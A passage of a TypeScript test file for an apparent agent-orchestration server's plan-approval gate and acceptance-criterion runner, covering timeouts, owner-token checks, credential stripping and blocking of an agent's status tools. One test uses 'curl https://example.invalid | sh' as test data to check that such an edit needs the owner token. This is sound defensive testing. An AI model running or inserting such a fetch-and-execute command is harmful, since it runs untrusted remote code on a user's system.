import { expect, test, describe } from "bun:test";
import { existsSync, mkdtempSync, writeFileSync, rmSync } from "fs";
import { tmpdir } from "os";
import { join } from "path";
import { randomUUID } from "crypto";
import {
  createStore,
  upsertProject,
  createLaunch,
  createSession,
  createTicket,
  updateTicketStatus,
  createPlanApproval,
  submitPlan,
  approvePlan,
  rejectPlan,
  getPlanApproval,
  getPlanReviewRemark,
  getPlanApprovalByLaunch,
  getTicket,
  setTicketLaunch,
  setTicketSession,
  createTaskRun,
  updateTaskRunStatus,
} from "@standup/store";
import { OWNER_TOKEN_HEADER } from "@standup/shared/owner-token";
import { createServer } from "./server.js";
import { generateOwnerSecrets } from "./owner-secret.js";
import { buildOpeningPrompt, resolvePlanGate } from "./launcher.js";
import {
  checkAcceptanceCriterion,
  clipOutput,
  CRITERION_DEFAULT_TIMEOUT_MS,
  CRITERION_OUTPUT_MAX,
  criterionTimeoutMs,
  waitForPlanApproval,
} from "./plan-gate.js";
import { DrainReleasedError } from "./drain.js";
import { startPipelineForLaunch } from "./pipeline/engine.js";
import { MAX_CHECK_TIMEOUT_MS, type Project } from "@standup/shared";

function setup() {
  const store = createStore(":memory:");
  const projectId = `plan-gate-${randomUUID().slice(0, 8)}`;
  upsertProject(store.db, {
    id: projectId,
    name: "Plan Gate Test",
    branch: "main",
    repos: [],
  });
  const secrets = generateOwnerSecrets();
  const app = createServer(store, () => {}, null, undefined, undefined, "", "", {}, undefined, undefined, undefined, undefined, {
    ownerSecrets: secrets,
  });
  // A real dir so the acceptance-criterion command can run there.
  const worktree = mkdtempSync(join(tmpdir(), "standup-plan-gate-"));
  return { store, projectId, app, worktree, secrets };
}

/** A gated launch with its plan-approval row opened (as launchSession would). */
function gatedLaunch(
  store: ReturnType<typeof createStore>,
  projectId: string,
  worktree: string
) {
  const launch = createLaunch(store.db, {
    id: randomUUID(),
    projectId,
    task: "Do the thing",
    worktreePath: worktree,
    branch: "standup/thing",
    status: "running",
  });
  const gate = createPlanApproval(store.db, {
    launchId: launch.id,
    projectId,
    worktreePath: worktree,
  });
  return { launch, gate };
}

function sleep(ms: number) {
  return new Promise((r) => setTimeout(r, ms));
}

describe("a criterion or check past its time", () => {
  test("is sent SIGTERM first, so a command that cleans up on it can", async () => {
    const dir = mkdtempSync(join(tmpdir(), "standup-criterion-term-"));
    try {
      const marker = join(dir, "cleaned");
      const res = await checkAcceptanceCriterion(dir, `trap 'echo done > ${marker}; exit 3' TERM; sleep 30 & wait`, 300);
      expect(res.met).toBe(false);
      expect(await Bun.file(marker).text()).toBe("done\n");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("is not met and says it timed out, with what it printed before", async () => {
    const dir = mkdtempSync(join(tmpdir(), "standup-criterion-timeout-"));
    try {
      const res = await checkAcceptanceCriterion(dir, "echo started; sleep 30", 300, undefined, undefined, {
        killGraceMs: 200,
      });
      expect(res.met).toBe(false);
      // SIGTERM stopped the whole group, so no SIGKILL was sent and the output doesn't claim one.
      expect(res.output.startsWith("timed out after 0.3s (SIGTERM); last output:")).toBe(true);
      expect(res.output.endsWith("started\ntimed out after 0.3s (SIGTERM)")).toBe(true);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("a descendant ignoring SIGTERM after the shell exits is SIGKILLed once the grace ends, as the output says", async () => {
    const dir = mkdtempSync(join(tmpdir(), "standup-criterion-orphan-"));
    try {
      const mark = join(dir, "MARK");
      const criterion = `sh -c 'trap "" TERM; sleep 1.5; touch ${mark}' >/dev/null 2>&1 & sleep 100`;
      const res = await checkAcceptanceCriterion(dir, criterion, 300, { PATH: process.env.PATH ?? "/usr/bin:/bin" }, undefined, {
        killGraceMs: 500,
        streamDrainMs: 200,
      });
      expect(res.met).toBe(false);
      expect(res.output.startsWith("timed out after 0.3s (SIGTERM, then SIGKILL after 0.5s); last output:")).toBe(true);
      await Bun.sleep(2500);
      expect(existsSync(mark)).toBe(false);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("reports the timeout of a killed pipeline that printed nothing", async () => {
    const dir = mkdtempSync(join(tmpdir(), "standup-criterion-pipe-"));
    try {
      const res = await checkAcceptanceCriterion(dir, "{ echo x; sleep 30; } | tail -1", 300, undefined, undefined, {
        killGraceMs: 200,
      });
      expect(res.met).toBe(false);
      expect(res.output).toContain("timed out after 0.3s");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("returns on time when a descendant that left the group holds its output open", async () => {
    const dir = mkdtempSync(join(tmpdir(), "standup-criterion-setsid-"));
    const pidFile = join(dir, "escaped.pid");
    try {
      const startedAt = Date.now();
      const res = await checkAcceptanceCriterion(
        dir,
        `setsid sh -c 'echo $$ > ${pidFile}; exec sleep 30' & echo started; sleep 30`,
        300,
        undefined,
        undefined,
        { killGraceMs: 200, streamDrainMs: 300 }
      );
      expect(Date.now() - startedAt).toBeLessThan(300 + 200 + 300 + 1000);
      expect(res.met).toBe(false);
      expect(res.output).toContain("timed out after");
      expect(res.output).toContain("started");
    } finally {
      const pid = Number((await Bun.file(pidFile).text().catch(() => "")).trim());
      if (pid > 1) {
        try {
          process.kill(pid, "SIGKILL");
        } catch {
          // Already gone.
        }
      }
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("a passing command whose background child keeps its output open still returns", async () => {
    const dir = mkdtempSync(join(tmpdir(), "standup-criterion-bg-"));
    try {
      const startedAt = Date.now();
      const res = await checkAcceptanceCriterion(dir, "( sleep 30 & ); echo done", 10_000, undefined, undefined, {
        streamDrainMs: 300,
      });
      expect(Date.now() - startedAt).toBeLessThan(2000);
      expect(res).toEqual({ met: true, output: "done" });
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("a criterion that backgrounds a server and exits 0 is met, and the server doesn't outlive the check", async () => {
    const dir = mkdtempSync(join(tmpdir(), "standup-criterion-server-"));
    try {
      const mark = join(dir, "MARK");
      const res = await checkAcceptanceCriterion(dir, `sh -c 'sleep 1; touch ${mark}' >/dev/null 2>&1 & exit 0`, 10_000, undefined, undefined, {
        streamDrainMs: 100,
      });
      expect(res).toEqual({ met: true, output: "" });
      await Bun.sleep(1500);
      expect(existsSync(mark)).toBe(false);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("a shell that exits before the deadline isn't timed out when its output drains past it", async () => {
    const dir = mkdtempSync(join(tmpdir(), "standup-criterion-drain-"));
    try {
      // The background child holds the pipes open past the 200ms deadline; the shell exited at once.
      const res = await checkAcceptanceCriterion(dir, "sleep 5 & echo done", 200, undefined, undefined, { streamDrainMs: 600 });
      expect(res).toEqual({ met: true, output: "done" });
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("a failure that did not time out names its exit code or signal", async () => {
    const dir = mkdtempSync(join(tmpdir(), "standup-criterion-exit-"));
    try {
      expect(await checkAcceptanceCriterion(dir, "echo boom >&2; exit 3")).toEqual({
        met: false,
        output: "boom\nexit code 3",
      });
      expect(await checkAcceptanceCriterion(dir, "exit 4")).toEqual({ met: false, output: "exit code 4" });
      expect(await checkAcceptanceCriterion(dir, "kill -9 $$")).toEqual({ met: false, output: "killed by SIGKILL" });
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("defaults to 20 minutes, overridable by STANDUP_CRITERION_TIMEOUT_S up to the check maximum", async () => {
    expect(criterionTimeoutMs({})).toBe(CRITERION_DEFAULT_TIMEOUT_MS);
    expect(CRITERION_DEFAULT_TIMEOUT_MS).toBe(20 * 60 * 1000);
    expect(criterionTimeoutMs({ STANDUP_CRITERION_TIMEOUT_S: "90" })).toBe(90_000);
    expect(criterionTimeoutMs({ STANDUP_CRITERION_TIMEOUT_S: " 1.5 " })).toBe(1500);
    expect(criterionTimeoutMs({ STANDUP_CRITERION_TIMEOUT_S: "999999" })).toBe(MAX_CHECK_TIMEOUT_MS);
    for (const bad of ["", "0", "-5", "abc", "Infinity"]) {
      expect(criterionTimeoutMs({ STANDUP_CRITERION_TIMEOUT_S: bad })).toBe(CRITERION_DEFAULT_TIMEOUT_MS);
    }

    const dir = mkdtempSync(join(tmpdir(), "standup-criterion-env-"));
    const before = process.env.STANDUP_CRITERION_TIMEOUT_S;
    process.env.STANDUP_CRITERION_TIMEOUT_S = "0.3";
    try {
      const res = await checkAcceptanceCriterion(dir, "sleep 30", undefined, undefined, undefined, { killGraceMs: 200 });
      expect(res.met).toBe(false);
      expect(res.output).toStartWith("timed out after 0.3s");
      expect(res.output).toContain("(no output)");
    } finally {
      if (before === undefined) delete process.env.STANDUP_CRITERION_TIMEOUT_S;
      else process.env.STANDUP_CRITERION_TIMEOUT_S = before;
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("keeps the start and the end of long output: a test runner's summary prints last", () => {
    const output = `${"start ".repeat(100)}${"x".repeat(5000)} 3 fail: reconnect resyncs`;
    const clipped = clipOutput(output);
    expect(clipped.length).toBe(CRITERION_OUTPUT_MAX);
    expect(clipped.startsWith("start start")).toBe(true);
    expect(clipped.endsWith("3 fail: reconnect resyncs")).toBe(true);
    expect(clipOutput("short")).toBe("short");
  });
});

describe("plan-approval gate", () => {
  test("a gated launch yields a plan awaiting approval, and approval releases the run with edits", async () => {
    const { store, projectId, app, worktree, secrets } = setup();
    try {
      const { gate } = gatedLaunch(store, projectId, worktree);
      expect(gate.status).toBe("awaiting_plan");

      // submit_plan blocks until a human resolves it — fire it without awaiting.
      const submit = app.request("/api/plan/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          cwd: worktree,
          plan: "Refactor the widget",
          relevant_files: ["src/widget.ts"],
          acceptance_criterion: "false",
        }),
      });

      // The plan now shows up awaiting approval.
      let pending: any[] = [];
      for (let i = 0; i < 40 && pending.length === 0; i++) {
        const res = await app.request("/api/plans/pending");
        pending = ((await res.json()) as { plans: any[] }).plans;
        if (pending.length === 0) await sleep(25);
      }
      expect(pending.length).toBe(1);
      expect(pending[0].status).toBe("awaiting_approval");
      expect(pending[0].plan).toBe("Refactor the widget");
      expect(pending[0].relevantFiles).toEqual(["src/widget.ts"]);

      // Editing the acceptance criterion changes a command the collector runs,
      // so it needs the owner token; without it the plan stays awaiting.
      const refused = await app.request(`/api/plans/${pending[0].id}/approve`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ plan: "Refactor the widget carefully", acceptanceCriterion: "true", actor: "alice" }),
      });
      expect(refused.status).toBe(403);
      expect(getPlanApprovalByLaunch(store.db, pending[0].launchId)?.status).toBe("awaiting_approval");

      // Approve as the owner, editing the plan and the acceptance criterion.
      const approveRes = await app.request(`/api/plans/${pending[0].id}/approve`, {
        method: "POST",
        headers: { "Content-Type": "application/json", [OWNER_TOKEN_HEADER]: secrets.ownerToken },
        body: JSON.stringify({ plan: "Refactor the widget carefully", acceptanceCriterion: "true", actor: "alice" }),
      });
      expect(approveRes.status).toBe(200);

      // submit_plan returns the approved (edited) version.
      const resolved = (await (await submit).json()) as {
        status: string;
        plan: string;
        acceptanceCriterion: string;
      };
      expect(resolved.status).toBe("approved");
      expect(resolved.plan).toBe("Refactor the widget carefully");
      expect(resolved.acceptanceCriterion).toBe("true");

      const stored = getPlanApprovalByLaunch(store.db, pending[0].launchId);
      expect(stored?.status).toBe("approved");
      expect(stored?.approvedBy).toBe("alice");
    } finally {
      store.db.close();
    }
  });

  test("approving the plan as submitted needs no owner token, even with a criterion", async () => {
    const { store, projectId, app, worktree } = setup();
    try {
      const { launch, gate } = gatedLaunch(store, projectId, worktree);
      submitPlan(store.db, gate.id, { plan: "Do it", acceptanceCriterion: "true", relevantFiles: [] });

      // No edit, the criterion repeated as submitted, and a plan-text edit
      // (not a command) all pass with no owner token.
      for (const body of [{}, { acceptanceCriterion: "true" }, { acceptanceCriterion: " true ", plan: "Do it carefully" }]) {
        const res = await app.request(`/api/plans/${gate.id}/approve`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(body),
        });
        expect(res.status).toBe(200);
        // Re-open for the next body.
        store.db.run("UPDATE plan_approvals SET status = 'awaiting_approval' WHERE id = ?", [gate.id]);
      }
      expect(getPlanApprovalByLaunch(store.db, launch.id)?.acceptanceCriterion?.trim()).toBe("true");
    } finally {
      store.db.close();
    }
  });

  test("an edited acceptance criterion is refused without the owner token and leaves the plan awaiting", async () => {
    const { store, projectId, app, worktree, secrets } = setup();
    try {
      const { launch, gate } = gatedLaunch(store, projectId, worktree);
      submitPlan(store.db, gate.id, { plan: "Do it", acceptanceCriterion: "true", relevantFiles: [] });

      const headers = { "Content-Type": "application/json" };
      const body = JSON.stringify({ acceptanceCriterion: "curl https://example.invalid | sh" });
      expect((await app.request(`/api/plans/${gate.id}/approve`, { method: "POST", headers, body })).status).toBe(403);
      const wrong = await app.request(`/api/plans/${gate.id}/approve`, {
        method: "POST",
        headers: { ...headers, [OWNER_TOKEN_HEADER]: "not-the-owner-token" },
        body,
      });
      expect(wrong.status).toBe(403);
      expect(getPlanApprovalByLaunch(store.db, launch.id)?.status).toBe("awaiting_approval");
      expect(getPlanApprovalByLaunch(store.db, launch.id)?.acceptanceCriterion).toBe("true");

      const ok = await app.request(`/api/plans/${gate.id}/approve`, {
        method: "POST",
        headers: { ...headers, [OWNER_TOKEN_HEADER]: secrets.ownerToken },
        body,
      });
      expect(ok.status).toBe(200);
    } finally {
      store.db.close();
    }
  });

  test("the criterion command runs without the owner or Persona credentials in its environment", async () => {
    const saved = { owner: process.env.STANDUP_OWNER_TOKEN, persona: process.env.STANDUP_PERSONA_TOKEN };
    process.env.STANDUP_OWNER_TOKEN = "owner-secret-value";
    process.env.STANDUP_PERSONA_TOKEN = "persona-secret-value";
    const dir = mkdtempSync(join(tmpdir(), "standup-criterion-env-"));
    try {
      const leak = await checkAcceptanceCriterion(dir, 'echo "o=$STANDUP_OWNER_TOKEN p=$STANDUP_PERSONA_TOKEN h=$HOME"');
      expect(leak.met).toBe(true);
      expect(leak.output).toContain("o= p= h=");
      expect(leak.output).not.toContain("secret-value");
    } finally {
      if (saved.owner === undefined) delete process.env.STANDUP_OWNER_TOKEN;
      else process.env.STANDUP_OWNER_TOKEN = saved.owner;
      if (saved.persona === undefined) delete process.env.STANDUP_PERSONA_TOKEN;
      else process.env.STANDUP_PERSONA_TOKEN = saved.persona;
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("the acceptance-criterion gate blocks mark_ready until it passes", async () => {
    const { store, projectId, app, worktree } = setup();
    try {
      const { launch, gate } = gatedLaunch(store, projectId, worktree);

      // A ticket in `developing`, implemented by this launch.
      const ticket = createTicket(store.db, {
        projectId,
        lens: "bugs",
        title: "Fix it",
        body: "…",
      });
      store.db.run("UPDATE tickets SET launch_id = ? WHERE id = ?", [launch.id, ticket.id]);
      updateTicketStatus(store.db, ticket.id, "approved");
      updateTicketStatus(store.db, ticket.id, "developing");

      // Plan approved, but with a criterion that FAILS.
      submitPlan(store.db, gate.id, {
        relevantFiles: [],
        plan: "the plan",
        acceptanceCriterion: "false",
      });
      approvePlan(store.db, gate.id, { acceptanceCriterion: "false" });

      // mark_ready_for_review is refused; the ticket stays developing.
      let res = await app.request(`/api/tickets/${ticket.id}/ready`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cwd: worktree, readyReason: "done" }),
      });
      expect(res.status).toBe(409);
      expect(getTicket(store.db, ticket.id)!.status).toBe("developing");

      // Human edits the criterion to one that passes; now mark_ready succeeds.
      approvePlan(store.db, gate.id, { acceptanceCriterion: "true" });
      res = await app.request(`/api/tickets/${ticket.id}/ready`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cwd: worktree, readyReason: "done" }),
      });
      expect(res.status).toBe(200);
      expect(getTicket(store.db, ticket.id)!.status).toBe("needs_review");
    } finally {
      store.db.close();
    }
  });

  test("a launch whose delivery pipeline is short of its code_review stage is refused before its criterion runs", async () => {
    const { store, projectId, app, worktree } = setup();
    try {
      const { launch, gate } = gatedLaunch(store, projectId, worktree);
      const ticket = createTicket(store.db, { projectId, lens: "bugs", title: "Fix it", body: "…" });
      store.db.run("UPDATE tickets SET launch_id = ? WHERE id = ?", [launch.id, ticket.id]);
      updateTicketStatus(store.db, ticket.id, "approved");
      updateTicketStatus(store.db, ticket.id, "developing");
      // The criterion leaves a marker when it runs.
      const marker = join(worktree, "criterion-ran");
      submitPlan(store.db, gate.id, { relevantFiles: [], plan: "the plan", acceptanceCriterion: `touch ${marker}` });
      approvePlan(store.db, gate.id, { acceptanceCriterion: `touch ${marker}` });
      startPipelineForLaunch(store.db, { launchId: launch.id, owner: "owner", projectId });

      for (const path of [`/api/tickets/${ticket.id}/ready`, `/api/tickets/${ticket.id}/status`]) {
        const res = await app.request(path, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ cwd: worktree, readyReason: "done", status: "needs_review" }),
        });
        expect(res.status).toBe(409);
        expect(((await res.json()) as { error: string }).error).toContain("delivery pipeline");
      }
      // Neither ran the criterion (nor would have spent an allow its validation stage waits for).
      expect(existsSync(marker)).toBe(false);
      expect(getPlanApproval(store.db, gate.id)!.criterionMet).toBe(false);
      expect(getTicket(store.db, ticket.id)!.status).toBe("developing");
    } finally {
      store.db.close();
    }
  });

  test("a plan not approved yet is what a launch short of its code_review stage is told first, not the pipeline", async () => {
    const { store, projectId, app, worktree } = setup();
    try {
      const { launch, gate } = gatedLaunch(store, projectId, worktree);
      const ticket = createTicket(store.db, { projectId, lens: "bugs", title: "Fix it", body: "…" });
      store.db.run("UPDATE tickets SET launch_id = ? WHERE id = ?", [launch.id, ticket.id]);
      updateTicketStatus(store.db, ticket.id, "approved");
      updateTicketStatus(store.db, ticket.id, "developing");
      startPipelineForLaunch(store.db, { launchId: launch.id, owner: "owner", projectId });
      const ready = async () => {
        const out: string[] = [];
        for (const path of [`/api/tickets/${ticket.id}/ready`, `/api/tickets/${ticket.id}/status`]) {
          const res = await app.request(path, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ cwd: worktree, readyReason: "done", status: "needs_review" }),
          });
          expect(res.status).toBe(409);
          out.push(((await res.json()) as { error: string }).error);
        }
        return out;
      };

      for (const error of await ready()) {
        expect(error).toContain("submit_plan");
        expect(error).not.toContain("delivery pipeline");
      }
      submitPlan(store.db, gate.id, { relevantFiles: [], plan: "the plan", acceptanceCriterion: "true" });
      for (const error of await ready()) {
        expect(error).toContain("awaiting human approval");
        expect(error).not.toContain("delivery pipeline");
      }
      // Once approved, the pipeline is what refuses.
      approvePlan(store.db, gate.id, { acceptanceCriterion: "true" });
      for (const error of await ready()) expect(error).toContain("delivery pipeline");
      expect(getTicket(store.db, ticket.id)!.status).toBe("developing");
    } finally {
      store.db.close();
    }
  });

  test("a rework cycle re-checks the acceptance criterion — a cached pass does not carry a broken rework into review", async () => {
    const { store, projectId, app, worktree } = setup();
    try {
      const { launch, gate } = gatedLaunch(store, projectId, worktree);
      const ticket = createTicket(store.db, {
        projectId,
        lens: "bugs",
        title: "Fix it",
        body: "…",
      });
      store.db.run("UPDATE tickets SET launch_id = ? WHERE id = ?", [launch.id, ticket.id]);
      updateTicketStatus(store.db, ticket.id, "approved");
      updateTicketStatus(store.db, ticket.id, "developing");

      // Criterion checks a marker file in the worktree — passes while it exists,
      // fails after a rework removes it (standing in for broken code).
      const marker = join(worktree, "build-ok");
      writeFileSync(marker, "");
      submitPlan(store.db, gate.id, { relevantFiles: [], plan: "the plan", acceptanceCriterion: "test -f build-ok" });
      approvePlan(store.db, gate.id, {});

      // First review cycle: criterion passes, ticket advances, pass is cached.
      let res = await app.request(`/api/tickets/${ticket.id}/ready`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cwd: worktree, readyReason: "done" }),
      });
      expect(res.status).toBe(200);
      expect(getTicket(store.db, ticket.id)!.status).toBe("needs_review");
      expect(getPlanApprovalByLaunch(store.db, launch.id)!.criterionMet).toBe(true);

      // Reviewer sends it back for rework (needs_review -> developing).
      res = await app.request(`/api/tickets/${ticket.id}/status`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ status: "developing", note: "more to do" }),
      });
      expect(res.status).toBe(200);
      expect(getTicket(store.db, ticket.id)!.status).toBe("developing");
      // The cached pass must be cleared so the criterion re-runs next time.
      expect(getPlanApprovalByLaunch(store.db, launch.id)!.criterionMet).toBe(false);

      // The rework breaks the build (marker gone); mark_ready must be refused
      // again — the criterion is re-run, not served from the earlier pass.
      rmSync(marker);
      res = await app.request(`/api/tickets/${ticket.id}/ready`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cwd: worktree, readyReason: "done again" }),
      });
      expect(res.status).toBe(409);
      expect(getTicket(store.db, ticket.id)!.status).toBe("developing");
    } finally {
      store.db.close();
    }
  });

  test("an un-approved gate blocks ask_human", async () => {
    const { store, projectId, app, worktree } = setup();
    try {
      const { launch } = gatedLaunch(store, projectId, worktree);
      const sessionId = randomUUID();
      createSession(store.db, {
        id: sessionId,
        projectId,
        title: "s",
        cwd: worktree,
        status: "running",
      });
      store.db.run("UPDATE launches SET session_id = ? WHERE id = ?", [sessionId, launch.id]);

      const res = await app.request("/api/ask", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ session_id: sessionId, cwd: worktree, question: "which way?" }),
      });
      expect(res.status).toBe(409);
    } finally {
      store.db.close();
    }
  });

  test("an un-gated launch is unaffected: submit_plan reports no gate and mark_ready is not blocked", async () => {
    const { store, projectId, app, worktree } = setup();
    try {
      // A launch with NO plan_approval row — the default.
      const launch = createLaunch(store.db, {
        id: randomUUID(),
        projectId,
        task: "ungated",
        worktreePath: worktree,
        branch: "standup/ungated",
        status: "running",
      });
      const ticket = createTicket(store.db, {
        projectId,
        lens: "bugs",
        title: "Fix",
        body: "…",
      });
      store.db.run("UPDATE tickets SET launch_id = ? WHERE id = ?", [launch.id, ticket.id]);
      updateTicketStatus(store.db, ticket.id, "approved");
      updateTicketStatus(store.db, ticket.id, "developing");

      const submitRes = await app.request("/api/plan/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cwd: worktree, plan: "whatever" }),
      });
      expect(((await submitRes.json()) as { status: string }).status).toBe("no_gate");

      const readyRes = await app.request(`/api/tickets/${ticket.id}/ready`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cwd: worktree, readyReason: "done" }),
      });
      expect(readyRes.status).toBe(200);
      expect(getTicket(store.db, ticket.id)!.status).toBe("needs_review");
    } finally {
      store.db.close();
    }
  });

  test("report_ticket_status needs_review is blocked by a failing acceptance criterion (agent can't bypass mark_ready via a sibling tool)", async () => {
    const { store, projectId, app, worktree } = setup();
    try {
      const { launch, gate } = gatedLaunch(store, projectId, worktree);
      const ticket = createTicket(store.db, {
        projectId,
        lens: "bugs",
        title: "Fix it",
        body: "",
      });
      setTicketLaunch(store.db, ticket.id, launch.id);
      updateTicketStatus(store.db, ticket.id, "approved");
      updateTicketStatus(store.db, ticket.id, "developing");

      approvePlan(
        store.db,
        submitPlan(store.db, gate.id, {
          relevantFiles: [],
          plan: "p",
          acceptanceCriterion: "false",
        }).id,
        { acceptanceCriterion: "false" }
      );

      const blocked = await app.request(`/api/tickets/${ticket.id}/status`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ status: "needs_review", note: "impl done" }),
      });
      expect(blocked.status).toBe(409);
      expect(getTicket(store.db, ticket.id)!.status).toBe("developing");

      approvePlan(store.db, gate.id, { acceptanceCriterion: "true" });
      const ok = await app.request(`/api/tickets/${ticket.id}/status`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ status: "needs_review", note: "impl done" }),
      });
      expect(ok.status).toBe(200);
      expect(getTicket(store.db, ticket.id)!.status).toBe("needs_review");
    } finally {
      store.db.close();
    }
  });

  test("report_task succeeded is blocked by a failing acceptance criterion — ticket stays developing with the criterion output on the card", async () => {
    const { store, projectId, app, worktree } = setup();
    try {
      const { launch, gate } = gatedLaunch(store, projectId, worktree);
      const sessionId = randomUUID();
      createSession(store.db, {
        id: sessionId,
        projectId,
        title: "",
        cwd: worktree,
        status: "running",
      });
      store.db.run("UPDATE launches SET session_id = ? WHERE id = ?", [sessionId, launch.id]);

      const ticket = createTicket(store.db, {
        projectId,
        lens: "bugs",
        title: "Fix it",
        body: "",
      });
      setTicketLaunch(store.db, ticket.id, launch.id);
      setTicketSession(store.db, ticket.id, sessionId);
      updateTicketStatus(store.db, ticket.id, "approved");
      updateTicketStatus(store.db, ticket.id, "developing");

      approvePlan(
        store.db,
        submitPlan(store.db, gate.id, {
          relevantFiles: [],
          plan: "p",
          acceptanceCriterion: "false",
        }).id,
        { acceptanceCriterion: "false" }
      );

      const run = createTaskRun(store.db, {
        id: randomUUID(),
        projectId,
        worktreePath: worktree,
        sessionId,
      });
      updateTaskRunStatus(store.db, run.id, "running");

      const res = await app.request("/api/report-task", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ session_id: sessionId, cwd: worktree, status: "succeeded", summary: "done" }),
      });
      // The run itself succeeded — that's the agent's own report and stays as
      // reported. But the ticket does NOT advance to needs_review while the
      // criterion is failing, and the block reason lands on the ticket card.
      expect(res.status).toBe(200);
      const fresh = getTicket(store.db, ticket.id)!;
      expect(fresh.status).toBe("developing");
      expect(fresh.error).toContain("acceptance criterion");
    } finally {
      store.db.close();
    }
  });

  test("a stale approved gate in one launch does not govern a later un-gated launch in the same in-place repo", async () => {
    const { store, projectId, app, worktree } = setup();
    try {
      // launch A: gated, approved with a criterion that would fail if reused.
      const { launch: launchA, gate: gateA } = gatedLaunch(store, projectId, worktree);
      approvePlan(
        store.db,
        submitPlan(store.db, gateA.id, {
          relevantFiles: [],
          plan: "A's plan",
          acceptanceCriterion: "false",
        }).id,
        { acceptanceCriterion: "false" }
      );

      // launch B: un-gated (no plan_approval row created), same worktree —
      // exactly the in_place case where every launch shares worktree_path.
      const launchB = createLaunch(store.db, {
        id: randomUUID(),
        projectId,
        task: "B",
        worktreePath: worktree,
        branch: "standup/b",
        status: "running",
      });
      const ticketB = createTicket(store.db, {
        projectId,
        lens: "bugs",
        title: "B's ticket",
        body: "",
      });
      setTicketLaunch(store.db, ticketB.id, launchB.id);
      updateTicketStatus(store.db, ticketB.id, "approved");
      updateTicketStatus(store.db, ticketB.id, "developing");

      // mark_ready on B must NOT resolve to A's stale gate — B is ungated.
      const ready = await app.request(`/api/tickets/${ticketB.id}/ready`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cwd: worktree, readyReason: "done" }),
      });
      expect(ready.status).toBe(200);
      expect(getTicket(store.db, ticketB.id)!.status).toBe("needs_review");

      // A's gate is untouched by B (no cross-launch corruption via a stray
      // worktree match on submit_plan / approval routes).
      const stillA = getPlanApprovalByLaunch(store.db, launchA.id)!;
      expect(stillA.status).toBe("approved");
      expect(stillA.plan).toBe("A's plan");
    } finally {
      store.db.close();
    }
  });
});

describe("plan decisions across a released waiter", () => {
  const post = (app: ReturnType<typeof setup>["app"], path: string, body?: unknown) =>
    app.request(path, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      ...(body === undefined ? {} : { body: JSON.stringify(body) }),
    });

  test("a rejection without feedback that lands before the retried submit is delivered to that retry", async () => {
    const { store, projectId, app, worktree } = setup();
    try {
      const { gate } = gatedLaunch(store, projectId, worktree);
      // The first call's waiter is gone (released by a restart, or its client gave up).
      const first = await post(app, "/api/plan/submit", { cwd: worktree, plan: "v1", timeout_s: 0.05 });
      expect(await first.json()).toMatchObject({ status: "timeout" });
      // The console's Reject button posts no body.
      expect((await post(app, `/api/plans/${gate.id}/reject`)).status).toBe(200);
      expect(getPlanReviewRemark(store.db, gate.id)).toEqual({ delivered: false });

      const retry = (await (await post(app, "/api/plan/submit", { cwd: worktree, plan: "v1, reworded", timeout_s: 0.05 })).json()) as Record<string, unknown>;
      expect(retry).toMatchObject({ status: "rejected", plan: "v1" });
      expect(retry.feedback).toBeUndefined();
      expect(getPlanApproval(store.db, gate.id)).toMatchObject({ status: "rejected", plan: "v1" });
      expect(getPlanReviewRemark(store.db, gate.id)).toEqual({ delivered: true });

      // Having seen the rejection, the next submission opens a new round.
      const revised = post(app, "/api/plan/submit", { cwd: worktree, plan: "v2", timeout_s: 5 });
      for (let i = 0; i < 50 && getPlanApproval(store.db, gate.id)!.status !== "awaiting_approval"; i++) await sleep(10);
      expect(getPlanApproval(store.db, gate.id)).toMatchObject({ status: "awaiting_approval", plan: "v2" });
      expect(getPlanReviewRemark(store.db, gate.id)).toBeNull();
      expect((await post(app, `/api/plans/${gate.id}/approve`, {})).status).toBe(200);
      expect(await (await revised).json()).toMatchObject({ status: "approved", plan: "v2" });
    } finally {
      store.db.close();
    }
  });

  test("a waiter that is still waiting when the rejection lands gets it, and a later submission starts a new round", async () => {
    const { store, projectId, app, worktree } = setup();
    try {
      const { gate } = gatedLaunch(store, projectId, worktree);
      const waiting = post(app, "/api/plan/submit", { cwd: worktree, plan: "v1", timeout_s: 5 });
      for (let i = 0; i < 50 && getPlanApproval(store.db, gate.id)!.status !== "awaiting_approval"; i++) await sleep(10);
      expect((await post(app, `/api/plans/${gate.id}/reject`)).status).toBe(200);
      expect(await (await waiting).json()).toMatchObject({ status: "rejected", plan: "v1" });
      expect(getPlanReviewRemark(store.db, gate.id)).toEqual({ delivered: true });

      const revised = post(app, "/api/plan/submit", { cwd: worktree, plan: "v2", timeout_s: 0.05 });
      expect(await (await revised).json()).toMatchObject({ status: "timeout" });
